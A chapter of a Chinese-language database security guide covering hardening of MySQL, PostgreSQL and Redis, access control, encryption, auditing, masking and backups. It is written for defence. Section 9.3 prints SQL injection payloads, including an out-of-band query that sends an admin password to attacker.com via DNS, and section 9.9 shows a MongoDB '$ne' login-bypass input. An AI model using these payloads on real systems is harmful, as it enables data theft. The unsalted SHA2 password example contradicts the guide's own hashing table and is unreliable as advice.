## 九、数据库安全防护方案

数据库是企业最核心的数据资产载体。无论是用户隐私、交易记录还是商业机密，最终都以结构化或半结构化的形式存储在数据库中。据统计，2025年全球数据泄露事件中，超过40%直接源于数据库层面的安全缺陷——弱口令、未打补丁、权限失控、SQL注入等老问题仍然占据主流。本章从攻击者视角和防御者视角两个维度，系统性地构建数据库安全防护体系。

### 9.1 安全基线配置

安全基线是数据库部署后的第一道防线。基线配置的目标是关闭不必要的暴露面，强制执行最低安全标准。

#### 9.1.1 MySQL 安全加固

```sql
-- ==================== 账户安全 ====================

-- 1. 删除匿名账户（默认安装会创建空用户名账户）
DELETE FROM mysql.user WHERE User = '';
FLUSH PRIVILEGES;

-- 2. 禁止远程 root 登录，仅允许本地连接
DELETE FROM mysql.user
 WHERE User = 'root'
   AND Host NOT IN ('localhost', '127.0.0.1', '::1');
FLUSH PRIVILEGES;

-- 3. 删除测试数据库
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db = 'test' OR Db = 'test\\_%';

-- ==================== 密码策略 ====================

-- 4. 安装密码验证插件
INSTALL COMPONENT 'file://component_validate_password';

-- 5. 设置强密码策略
SET GLOBAL validate_password.length = 16;
SET GLOBAL validate_password.mixed_case_count = 2;
SET GLOBAL validate_password.number_count = 2;
SET GLOBAL validate_password.special_char_count = 2;
SET GLOBAL validate_password.policy = STRONG;

-- 6. 密码过期策略
SET GLOBAL default_password_lifetime = 90;  -- 每90天强制改密
ALTER USER 'app_user'@'%' PASSWORD EXPIRE INTERVAL 90 DAY;

-- ==================== 连接安全 ====================

-- 7. 限制最大连接数
SET GLOBAL max_connections = 200;

-- 8. 禁用 LOAD DATA LOCAL INFILE（防止文件读取攻击）
SET GLOBAL local_infile = 0;

-- 9. 限制文件导出路径
SET GLOBAL secure_file_priv = '/var/lib/mysql-files/';

-- 10. 设置连接超时
SET GLOBAL wait_timeout = 300;
SET GLOBAL interactive_timeout = 300;
SET GLOBAL connect_timeout = 10;

-- ==================== 审计 ====================

-- 11. 启用审计日志（MySQL Enterprise 或 Percona）
INSTALL PLUGIN audit_log SONAME 'audit_log.so';
SET GLOBAL audit_log_policy = 'ALL';
SET GLOBAL audit_log_format = 'JSON';
```

**my.cnf 关键安全参数**：

```ini
[mysqld]
# 禁止符号链接（防止文件系统越权）
symbolic-links = 0

# 禁用 LOCAL INFILE
local_infile = 0

# 错误日志详细级别
log_error_verbosity = 3

# 慢查询日志（辅助安全审计）
slow_query_log = 1
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 2

# 二进制日志（数据恢复与审计）
binlog_format = ROW
expire_logs_days = 30

# SSL/TLS 强制加密传输
require_secure_transport = ON
ssl-ca   = /etc/mysql/ssl/ca-cert.pem
ssl-cert = /etc/mysql/ssl/server-cert.pem
ssl-key  = /etc/mysql/ssl/server-key.pem
```

#### 9.1.2 PostgreSQL 安全加固

```sql
-- 1. 修改 pg_hba.conf 限制连接来源
-- TYPE  DATABASE  USER   ADDRESS        METHOD
-- host  all       all    10.0.0.0/8     scram-sha-256
-- host  all       all    0.0.0.0/0      reject

-- 2. 创建最小权限角色
CREATE ROLE app_readonly NOLOGIN;
GRANT CONNECT ON DATABASE mydb TO app_readonly;
GRANT USAGE ON SCHEMA public TO app_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_readonly;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT SELECT ON TABLES TO app_readonly;

CREATE ROLE app_readwrite NOLOGIN;
GRANT CONNECT ON DATABASE mydb TO app_readwrite;
GRANT USAGE, CREATE ON SCHEMA public TO app_readwrite;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_readwrite;

-- 3. 创建应用用户绑定角色
CREATE USER webapp WITH PASSWORD 'strong_random_password_here';
GRANT app_readwrite TO webapp;

-- 4. 启用 pgaudit 扩展
CREATE EXTENSION pgaudit;
SET pgaudit.log = 'write, ddl, role';
SET pgaudit.log_catalog = on;

-- 5. 配置 SSL 加密连接
-- postgresql.conf:
-- ssl = on
-- ssl_cert_file = '/etc/ssl/certs/server.crt'
-- ssl_key_file = '/etc/ssl/private/server.key'
-- ssl_ca_file = '/etc/ssl/certs/ca.crt'
```

**pg_hba.conf 最佳实践**：

| 行号 | 类型 | 数据库 | 用户 | 地址 | 认证方式 | 说明 |
|:---:|:---:|:---:|:---:|:---:|:---:|:---|
| 1 | local | all | postgres | - | peer | 系统root切换postgres用户 |
| 2 | host | mydb | app_user | 10.0.0.0/8 | scram-sha-256 | 内网应用连接 |
| 3 | hostssl | mydb | app_user | 0.0.0.0/0 | scram-sha-256 | 强制SSL远程连接 |
| 4 | host | all | all | 0.0.0.0/0 | reject | 默认拒绝所有 |

#### 9.1.3 Redis 安全加固

Redis 默认无认证、无加密、绑定所有接口，是互联网上被扫描最多的数据库之一。

```bash
# redis.conf 关键安全配置

# 1. 绑定到内网地址，不暴露公网
bind 127.0.0.1 10.0.0.5
protected-mode yes

# 2. 设置密码认证（Redis 6+ 推荐 ACL）
requirepass <strong_password_at_least_32_chars>

# Redis 6+ ACL 细粒度控制
ACL SETUSER app_user on >password ~app:* +@read +@write -@dangerous

# 3. 禁用危险命令
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command DEBUG ""
rename-command KEYS "KEYS_RESTRICTED"
rename-command CONFIG "CONFIG_ADMIN"
rename-command SHUTDOWN "SHUTDOWN_ADMIN"

# 4. 启用 TLS 加密
tls-port 6379
port 0
tls-cert-file /etc/redis/tls/redis.crt
tls-key-file /etc/redis/tls/redis.key
tls-ca-cert-file /etc/redis/tls/ca.crt
tls-auth-clients optional

# 5. 设置最大内存限制（防止 OOM）
maxmemory 4gb
maxmemory-policy allkeys-lru

# 6. 禁用 Lua 脚本的危险操作
lua-time-limit 5000
```

### 9.2 访问控制与权限管理

数据库安全的核心原则是**最小权限**——每个用户/应用只获得完成其工作所需的最低权限，不多给一个 SELECT。

#### 9.2.1 RBAC 权限模型设计

```text
数据库权限层级模型
│
├── 超级管理员（DBA）
│   ├── 全部 DDL + DML + 用户管理
│   ├── 仅限堡垒机/跳板机登录
│   └── 操作全程审计录像
│
├── 运维账号
│   ├── 备份恢复权限
│   ├── 性能监控权限（只读系统表）
│   └── 禁止查看业务数据内容
│
├── 应用账号
│   ├── 生产环境：仅 GRANT SELECT/INSERT/UPDATE/DELETE
│   ├── 禁止 DDL（CREATE/ALTER/DROP）
│   ├── 禁止 GRANT/REVOKE
│   └── 按库/按表粒度授权
│
├── 只读账号
│   ├── 仅 SELECT
│   ├── 用于报表、数据分析
│   └── 敏感字段需脱敏视图
│
└── 临时账号
    ├── 设定过期时间
    ├── 限定来源 IP
    └── 操作审计级别最高
```

**典型权限配置示例（MySQL）**：

```sql
-- 创建应用专用账号，仅授权到特定库
CREATE USER 'order_service'@'10.0.1.%'
  IDENTIFIED BY 'random_32_char_password'
  PASSWORD EXPIRE INTERVAL 90 DAY
  FAILED_LOGIN_ATTEMPTS 5
  PASSWORD_LOCK_TIME 2;

-- 仅授予必要权限
GRANT SELECT, INSERT, UPDATE ON ecommerce.orders TO 'order_service'@'10.0.1.%';
GRANT SELECT ON ecommerce.products TO 'order_service'@'10.0.1.%';
-- 不授予 DELETE（业务逻辑通过软删除实现）
-- 不授予 ecommerce.* 的全部权限

-- 查看授权结果
SHOW GRANTS FOR 'order_service'@'10.0.1.%';
```

### 9.3 SQL 注入防护

SQL 注入连续多年位列 OWASP Top 10。即使使用了 ORM 框架，拼接 SQL 的诱惑仍然存在。

#### 9.3.1 注入原理与攻击手法

```sql
-- 经典注入示例
-- 原始查询
SELECT * FROM users WHERE id = '${user_input}';

-- 攻击输入
1' UNION SELECT username, password FROM admin_users --

-- 拼接后执行的查询
SELECT * FROM users WHERE id = '1' UNION SELECT username, password FROM admin_users --';
-- 结果：攻击者获取了管理员表的全部数据

-- 带外注入（OOB）—— 通过 DNS 请求外传数据
-- MySQL 版本
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM admin LIMIT 1), '.attacker.com\\file'));
-- 攻击者在 DNS 日志中收到 exfil 数据
```

#### 9.3.2 参数化查询（唯一正确方案）

```python
# Python + pymysql —— 错误写法
cursor.execute(f"SELECT * FROM users WHERE id = '{user_id}'")  # 危险！

# Python + pymysql —— 正确写法（参数化查询）
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Java + JDBC —— 错误写法
# Statement stmt = conn.createStatement();
# stmt.executeQuery("SELECT * FROM users WHERE id = '" + userId + "'");

# Java + JDBC —— 正确写法
# PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
# pstmt.setString(1, userId);

# Go + database/sql —— 正确写法
# db.Query("SELECT * FROM users WHERE id = ?", userID)

# Node.js + mysql2 —— 正确写法
# connection.execute('SELECT * FROM users WHERE id = ?', [userId]);
```

#### 9.3.3 多层防御策略

| 防御层 | 措施 | 说明 |
|:---|:---|:---|
| 代码层 | 参数化查询 / ORM | 从源头杜绝注入 |
| 框架层 | 输入验证 + 过滤 | 拒绝非法字符和格式 |
| WAF 层 | SQL 注入规则集 | ModSecurity / 云 WAF |
| 数据库层 | 最小权限 + 存储过程 | 即使注入也难以提权 |
| 监控层 | 异常查询检测 | 高频/超长/含关键字的 SQL |

```python
# WAF 规则示例（ModSecurity SecRule）
# 检测 UNION SELECT 等典型注入模式
SecRule ARGS "@rx (?i)(union\s+select|sleep\(|benchmark\(|or\s+1\s*=\s*1)"
  "id:1001,phase:2,deny,status:403,log,msg:'SQL Injection Detected'"

# 输入验证示例
import re
def validate_user_id(user_id: str) -> bool:
    """用户ID必须是纯数字"""
    return bool(re.match(r'^\d{1,10}$', user_id))

def validate_pagination(page: str, size: str) -> tuple:
    """分页参数白名单校验"""
    p = int(page) if page.isdigit() and 1 <= int(page) <= 1000 else 1
    s = int(size) if size.isdigit() and 1 <= int(size) <= 100 else 20
    return p, s
```

### 9.4 数据加密

加密是数据泄露的最后一道防线——即使攻击者拿到数据文件，也无法直接读取内容。

#### 9.4.1 传输层加密（TLS/SSL）

```sql
-- MySQL 强制 TLS
-- my.cnf
-- require_secure_transport = ON

-- 验证连接是否使用 TLS
SHOW STATUS LIKE 'Ssl_cipher';
-- 结果非空说明连接已加密

-- PostgreSQL 强制 SSL
-- postgresql.conf: ssl = on
-- pg_hba.conf: hostssl mydb app_user 0.0.0.0/0 scram-sha-256

-- 验证
SELECT * FROM pg_stat_ssl WHERE pid = pg_backend_pid();
```

```bash
# 生成自签名证书（测试环境）
openssl req -x509 -newkey rsa:4096 -nodes \
  -keyout server-key.pem -out server-cert.pem \
  -days 365 -subj '/CN=db.internal'

# 生产环境应使用企业 CA 签发证书
```

#### 9.4.2 存储层加密（TDE）

TDE（Transparent Data Encryption）在存储引擎层自动加解密，对应用透明。

```sql
-- MySQL TDE 配置
-- my.cnf
-- [mysqld]
-- early-plugin-load=keyring_file.so
-- keyring_file_data=/var/lib/mysql-keyring/keyring

-- 生产环境应使用 keyring_hashicorp 或 keyring_aws
-- 避免密钥和数据存储在同一服务器

-- 创建加密表空间
CREATE TABLE sensitive_data (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100),
    ssn VARCHAR(11),
    credit_card VARCHAR(19)
) ENCRYPTION='Y';

-- 加密现有表
ALTER TABLE users ENCRYPTION='Y';

-- 查看加密状态
SELECT TABLE_SCHEMA, TABLE_NAME, CREATE_OPTIONS
FROM information_schema.TABLES
WHERE CREATE_OPTIONS LIKE '%ENCRYPTION%';
```

#### 9.4.3 列级加密

对高敏感字段（身份证号、银行卡号、密码）进行字段级加密。

```sql
-- MySQL AES 列级加密
-- 密钥管理是关键：密钥绝不能和加密数据存在同一库中

-- 加密存储
INSERT INTO users (username, password_hash, ssn_encrypted)
VALUES (
    'alice',
    SHA2('user_password', 256),           -- 密码用 SHA2 单向哈希
    AES_ENCRYPT('110101199001011234', @encryption_key)  -- 身份证用 AES 可逆加密
);

-- 查询时解密
SELECT username,
       AES_DECRYPT(ssn_encrypted, @encryption_key) AS ssn
FROM users WHERE username = 'alice';
```

#### 9.4.4 密码存储规范

| 方法 | 安全性 | 推荐度 | 说明 |
|:---|:---:|:---:|:---|
| 明文存储 | 极低 | 绝不 | 数据泄露即密码泄露 |
| MD5/SHA1 | 低 | 绝不 | 碰撞攻击可行，彩虹表可破解 |
| SHA256 无盐 | 中低 | 不推荐 | 彩虹表仍可攻击 |
| bcrypt | 高 | 推荐 | 自适应计算成本，抗 GPU 暴力破解 |
| Argon2id | 最高 | 首选 | 2015年密码哈希竞赛冠军 |

```python
# Python 密码哈希最佳实践（使用 argon2）
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # 迭代次数
    memory_cost=65536,  # 内存使用 64MB
    parallelism=4       # 并行度
)

# 注册时哈希
hash = ph.hash("user_password")
# 存入数据库：hash = "$argon2id$v=19$m=65536,t=3,p=4$..."

# 登录时验证
try:
    ph.verify(hash, "user_password")
    # 验证通过后检查是否需要 rehash（参数升级）
    if ph.check_needs_rehash(hash):
        new_hash = ph.hash("user_password")
        # 更新数据库中的 hash
except Exception:
    # 密码错误
    pass
```

### 9.5 数据库审计

审计是事后追溯的基础。没有审计日志，安全事件发生后你甚至不知道数据是否被窃取。

#### 9.5.1 审计策略设计

```text
数据库审计范围
├── 登录审计
│   ├── 成功/失败登录记录
│   ├── 登录来源 IP 和地理位置
│   ├── 登录时间和持续时长
│   └── 账户锁定事件
├── DDL 审计（结构变更）
│   ├── CREATE / ALTER / DROP TABLE
│   ├── CREATE / DROP INDEX
│   ├── GRANT / REVOKE（权限变更，最高优先级）
│   └── 存储过程/函数创建与修改
├── DML 审计（数据操作）
│   ├── 敏感表的 SELECT（查询了谁的数据）
│   ├── INSERT / UPDATE / DELETE 的行数
│   ├── UPDATE/DELETE 的 WHERE 条件是否合理
│   └── 大批量操作（阈值告警）
├── 异常行为审计
│   ├── 非工作时间访问（22:00-07:00）
│   ├── 非常用地点 IP 登录
│   ├── 单位时间内查询频率异常
│   ├── 短时间内大量数据导出
│   └── 权限提升尝试（访问未授权对象）
└── 系统审计
    ├── 配置变更（SET GLOBAL）
    ├── 备份操作
    ├── 复制状态变更
    └── 插件安装/卸载
```

#### 9.5.3 审计日志分析与告警

```python
# 审计日志实时分析脚本示例
import json
import time
from collections import defaultdict

ALERT_THRESHOLDS = {
    'failed_login_per_min': 10,      # 每分钟失败登录阈值
    'select_rows_per_min': 10000,    # 每分钟查询行数阈值
    'delete_per_hour': 100,          # 每小时删除操作阈值
    'non_work_hours': (22, 7),       # 非工作时间范围
}

def analyze_audit_log(log_entry: dict) -> list:
    alerts = []
    entry = json.loads(log_entry)

    # 检测异常时间访问
    hour = int(entry['timestamp'][11:13])
    start, end = ALERT_THRESHOLDS['non_work_hours']
    if hour >= start or hour < end:
        alerts.append(f"[WARNING] 非工作时间访问: {entry['account']['user']} @ {entry['timestamp']}")

    # 检测大批量 DELETE
    if entry.get('event') == 'delete':
        query = entry.get('query', '')
        if 'DELETE FROM' in query.upper() and 'WHERE' not in query.upper():
            alerts.append(f"[CRITICAL] 无 WHERE 条件的 DELETE: {query[:200]}")

    # 检测权限变更
    if entry.get('class') == 'authorization':
        alerts.append(f"[CRITICAL] 权限变更: {entry.get('query', '')[:200]}")

    return alerts
```

### 9.6 数据脱敏与隐私保护

在开发、测试、数据分析场景中，真实数据不应直接暴露给非生产环境。

#### 9.6.1 静态脱敏

```sql
-- 创建脱敏视图（开发/测试环境使用）
CREATE VIEW users_masked AS
SELECT
    id,
    CONCAT(LEFT(username, 2), '***') AS username,
    CONCAT('***', RIGHT(phone, 4)) AS phone,
    CONCAT(LEFT(email, 2), '***@', SUBSTRING_INDEX(email, '@', -1)) AS email,
    CONCAT(LEFT(id_card, 3), '***********', RIGHT(id_card, 4)) AS id_card,
    '********' AS password_hash  -- 密码哈希完全隐藏
FROM users;

-- 开发人员只授权访问脱敏视图
GRANT SELECT ON users_masked TO dev_readonly;
```

#### 9.6.2 动态脱敏

动态脱敏在查询返回结果时实时脱敏，无需创建额外视图。

```python
# 应用层动态脱敏中间件
import re

MASKING_RULES = {
    'phone': lambda v: v[:3] + '****' + v[-4:] if len(v) == 11 else '***',
    'id_card': lambda v: v[:3] + '***********' + v[-4:] if len(v) == 18 else '***',
    'email': lambda v: v[:2] + '***@' + v.split('@')[-1] if '@' in v else '***',
    'bank_card': lambda v: '**** **** **** ' + v[-4:] if len(v) >= 16 else '***',
}

def mask_row(row: dict, sensitive_fields: list) -> dict:
    masked = dict(row)
    for field in sensitive_fields:
        if field in masked and masked[field]:
            masked[field] = MASKING_RULES.get(field, lambda v: '***')(str(masked[field]))
    return masked
```

### 9.7 备份安全

备份是数据安全的最后保障，但备份文件本身也是高价值攻击目标。

#### 9.7.1 备份加密与存储

```bash
#!/bin/bash
# MySQL 备份加密脚本

BACKUP_DIR="/backup/mysql"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="${BACKUP_DIR}/full_backup_${DATE}.sql.gz"
GPG_RECIPIENT="backup@company.com"

# 使用 mysqldump 备份 + gzip 压缩 + GPG 加密
mysqldump --single-transaction --routines --triggers \
  --all-databases | gzip | \
  gpg --encrypt --recipient "$GPG_RECIPIENT" \
  --output "${BACKUP_FILE}.gpg"

# 计算校验和
sha256sum "${BACKUP_FILE}.gpg" > "${BACKUP_FILE}.sha256"

# 上传到异地存储（S3/OSS/MinIO）
aws s3 cp "${BACKUP_FILE}.gpg" "s3://db-backups/mysql/" --storage-class GLACIER
aws s3 cp "${BACKUP_FILE}.sha256" "s3://db-backups/mysql/"

# 清理本地超过 7 天的备份
find "$BACKUP_DIR" -name "*.gpg" -mtime +7 -delete

echo "[$(date)] Backup completed: ${BACKUP_FILE}.gpg"
```

#### 9.7.2 备份恢复演练

备份不测试等于没有备份。至少每季度执行一次恢复演练。

### 9.8 数据库防火墙与活动监控

#### 9.8.1 数据库防火墙

数据库防火墙位于应用和数据库之间，实时分析 SQL 并拦截恶意查询。

```text
应用服务器 ──→ 数据库防火墙 ──→ 数据库
                 │
                 ├── SQL 语法解析
                 ├── 白名单匹配（只允许预定义的 SQL 模板）
                 ├── 异常行为检测（查询行数/频率/模式）
                 ├── 注入特征识别
                 └── 实时告警 + 阻断
```

**常用数据库防火墙方案**：

| 方案 | 类型 | 特点 |
|:---|:---:|:---|
| MySQL Enterprise Firewall | 商业 | MySQL 官方，学习模式+阻断模式 |
| ProxySQL | 开源 | 代理层，支持查询规则和限流 |
| DBShield | 开源 | 轻量级，支持 MySQL/PostgreSQL |
| 云数据库防火墙 | 云服务 | 阿里云 DAS/AWS RDS Proxy |

```sql
-- MySQL Enterprise Firewall 使用示例

-- 1. 安装
INSTALL PLUGIN mysql_firewall SONAME 'firewall.so';
INSTALL PLUGIN mysql_firewall_users SONAME 'firewall.so';
INSTALL PLUGIN mysql_firewall_whitelist SONAME 'firewall.so';

-- 2. 注册需要保护的用户
CALL mysql.sp_set_firewall_user_mode('order_service@%', 'RECORDING');

-- 3. 让应用正常运行一段时间，防火墙学习正常 SQL 模式
-- 学习完成后切换到 PROTECTING 模式
CALL mysql.sp_set_firewall_user_mode('order_service@%', 'PROTECTING');

-- 4. 查看拦截统计
SELECT * FROM mysql.firewall_users;
```

#### 9.8.2 数据库活动监控（DAM）

```sql
-- PostgreSQL pg_stat_statements 监控慢查询和异常查询
CREATE EXTENSION pg_stat_statements;

-- 查询执行频率最高的 SQL（可能的注入点）
SELECT query, calls, total_exec_time, rows
FROM pg_stat_statements
ORDER BY calls DESC LIMIT 20;

-- 查询执行时间最长的 SQL（性能异常）
SELECT query, calls, mean_exec_time, max_exec_time
FROM pg_stat_statements
ORDER BY mean_exec_time DESC LIMIT 20;
```

### 9.9 NoSQL 安全要点

NoSQL 数据库的安全往往被忽视，但它们同样存储着关键业务数据。

#### 9.9.1 常见 NoSQL 攻击手法

| 攻击手法 | 影响的数据库 | 危害 |
|:---|:---|:---|
| NoSQL 注入（JSON 注入） | MongoDB, CouchDB | 绕过认证，数据泄露 |
| SSRF 通过数据库 | Redis, Elasticsearch | 内网穿透，数据窃取 |
| 未授权访问 | Redis, Elasticsearch, MongoDB | 数据被删/勒索 |
| 聚合管道注入 | MongoDB | 代码执行 |
| 运算符注入 | MongoDB | 认证绕过 |

```javascript
// MongoDB NoSQL 注入示例
// 原始登录查询
db.users.find({ username: req.body.username, password: req.body.password })

// 攻击输入
{ "username": "admin", "password": { "$ne": "" } }
```

### 9.10 合规与数据分类

不同行业有不同的数据保护法规要求，数据库安全方案必须符合相关合规标准。

#### 9.10.1 数据分类标准

| 级别 | 分类 | 示例 | 保护要求 |
|:---:|:---|:---|:---|
| L4 | 绝密 | 核心算法、密钥 | 隔离存储、硬件加密、双人操作 |
| L3 | 机密 | 身份证号、银行卡号、医疗记录 | TDE + 列加密 + 脱敏 + 审计 |

### 9.12 实战案例分析

#### 案例一：Redis 未授权访问勒索事件

**事件经过**：2024年某创业公司 Redis 实例绑定 0.0.0.0 且无密码，攻击者通过 `redis-cli -h 公网IP` 直接连接，执行 `FLUSHALL` 清空数据，然后写入勒索信息。

**根因分析**：
1. Redis 默认 bind 0.0.0.0 且无 requirepass
2. 云服务器安全组开放 6379 端口
3. 无备份策略，数据无法恢复

**修复措施**：
```bash
# 1. 立即：绑定内网地址 + 设置密码
bind 127.0.0.1 10.0.0.5
requirepass $(openssl rand -base64 32)

# 2. 安全组仅允许应用服务器 IP 访问 6379
# 3. 启用 AOF 持久化 + 每日 RDB 备份到异地
# 4. 监控：连接来源 IP 告警
```

#### 案例二：SQL 注入导致千万级数据泄露

**事件经过**：某电商平台搜索接口直接拼接用户输入到 SQL 查询，攻击者通过 UNION 注入获取了用户表全量数据（含手机号、地址、身份证号）。

**根因分析**：
1. 代码层面：字符串拼接 SQL，未使用参数化查询
2. WAF 缺失：未部署 Web 应用防火墙
3. 权限过大：查询账号拥有 SELECT 权限到全部表

**修复措施**：
1. 全面排查代码中的字符串拼接 SQL，改用参数化查询
2. 部署 ModSecurity + OWASP CRS 规则集
3. 应用账号按库按表最小权限授权
4. 敏感字段启用列级加密
5. 部署数据库防火墙，启用 SQL 白名单模式

***

> 数据库安全不是一次性工程，而是持续运营。每次部署新库、新增账号、变更权限、发布新功能，都要回归安全基线检查。攻击者只需要找到一个缺口，而防御者需要守住每一道门。安全的本质是成本博弈——让攻击成本高于收益，就是成功的防御。
